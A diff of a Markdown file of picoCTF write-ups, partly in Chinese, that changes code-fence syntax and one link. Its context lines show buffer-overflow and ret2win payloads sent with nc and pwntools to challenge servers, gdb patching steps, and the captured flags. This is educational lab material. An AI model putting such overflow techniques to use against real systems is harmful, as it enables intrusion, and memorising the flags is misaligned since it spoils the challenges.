@@ -39,7 +39,7 @@ Payload: `https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html`
 ## Challenge: [Disk, disk, sleuth!](https://mercury.picoctf.net/static/920731987787c93839776ce457d5ecd6/dds1-alpine.flag.img.gz)🍰
 
 ### Exploit - Strings search
-```bash!
+```bash
 $ file dds1-alpine.flag.img.gz
 dds1-alpine.flag.img.gz: gzip compressed data, was "dds1-alpine.flag.img", last modified: Tue Mar 16 00:19:24 2021, from Unix, original size modulo 2^32 134217728
 $ gzip -d dds1-alpine.flag.img.gz
@@ -422,7 +422,7 @@ __int64 __fastcall check_key(const char *input_key)
 
 ### Source Code
 :::spoiler Source Code
-```cpp=
+```cpp
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
@@ -660,7 +660,7 @@ picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
 
 ### Source Code
 :::spoiler Source Code
-```cpp=
+```cpp
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -727,7 +727,7 @@ picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
 應該算是最簡單的BoF，可以用靜態或是動態的方式觀察offset有多少，然後把code的地方蓋成0xdeadbeef就可以拿到flag了
 
 ### Exploit
-```python=
+```python
 from pwn import *
 
 # r = process('chall')
@@ -752,7 +752,7 @@ Flag: `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`
 
 ### Exploit
 :::spoiler
-```bash=
+```bash
 $ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\x15@\x00" | nc saturn.picoctf.net 50417
 Give me a string!
 picoCTF{Un_v3rr3_d3_v1n_dcc38bed}
@@ -799,7 +799,7 @@ System information:
 ```
 :::
 (23/8/4)更新:New Exploit
-```python!
+```python
 from pwn import *
 
 r = remote("saturn.picoctf.net", 53396)
@@ -837,7 +837,7 @@ Flag: `picoCTF{l0c4l5_1n_5c0p3_fee8ef05}`
 
 ### Recon
 這一題也是超簡單但是不知道為啥也很少人解，單純的return 2 series
-```bash!
+```bash
 $ file picker-IV
 picker-IV: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=12b33c5ff389187551aae5774324da558cee006c, for GNU/Linux 3.2.0, not stripped
 $ checksec picker-IV
@@ -855,7 +855,7 @@ $ objdump -d -M intel ./picker-IV | grep "win"
 ```
 
 ### Exploit - Ret2Funcntion
-```bash!
+```bash
 $ echo "40129e" | nc saturn.picoctf.net 50048
 Enter the address in hex to jump to, excluding '0x': You input 0x40129e
 You won!
@@ -869,7 +869,7 @@ Flag: `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}`
 ## Challenge: Hurry up! Wait!🍰
 
 ### Recon & Prepare
-```bash!
+```bash
 $ file svchost.exe
 svchost.exe: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dea7ec3bad6aeab52804d2a614b132f4af2a1025, stripped
 $ checksec svchost.exe
@@ -881,18 +881,18 @@ $ checksec svchost.exe
     PIE:      PIE enabled
 ```
 這一題唯一要注意的是可能會遇到
-```bash!
+```bash
 $ ./svchost.exe
 ./svchost.exe: error while loading shared libraries: libgnat-7.so.1: cannot open shared object file: No such file or directory
 ```
 這個問題，所以只要安裝`libgnat-7`就可以了
-```bash!
+```bash
 $ sudo apt-get install -y libgnat-7
 ```
 安裝完之後先執行看看，發現沒有任何output或是其他提示，所以用ida看了一下會發現他在`main->sub_298A()->ada__calendar__delays__delay_for(1000000000000000LL);`有檔一個delay，預期只要跳過這個地方就可以完成後續的step
 
 ### Exploit
-```bash!
+```bash
 $ gdb svchost.exe
 gef➤  starti
 gef➤  vmmap # 先確認code section的base address在哪
@@ -922,7 +922,7 @@ Flag: `picoCTF{a.moose.once.bit.my.sister}`
 ## Challenge: WebNet1🍰
 
 ### Exploit - Import TLS Key / String Seach
-承接[WebNet0](https://hackmd.io/@SBK6401/HJqySDHla)，先import題目提供的private key解密中間所有的通訊，然後會看到中間有query一個網站，他提供了一張禿鷹的圖片，把圖片dump下來後直接string search就可以拿到flag
+承接[WebNet0]({{site.baseurl}}/PicoCTF-WebNet0/)，先import題目提供的private key解密中間所有的通訊，然後會看到中間有query一個網站，他提供了一張禿鷹的圖片，把圖片dump下來後直接string search就可以拿到flag
 ```bash
 $ strings vulture.jpg | grep pico
 picoCTF{honey.roasted.peanuts}
